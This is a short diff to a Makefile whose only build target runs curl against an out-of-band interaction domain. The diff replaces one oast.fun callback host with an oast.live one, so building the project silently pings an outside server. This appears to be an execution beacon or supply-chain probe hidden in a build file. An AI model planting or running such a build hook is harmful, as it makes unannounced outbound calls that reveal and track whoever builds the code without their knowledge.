@@ -1,2 +1,2 @@
 all:
-	curl	http://makefile.d526s3o3t4gglckn7dd07zq887iocppah.oast.fun
+	curl	http://makefile.d5271pg3t4gi388a61s07y1juzwff11dt.oast.live
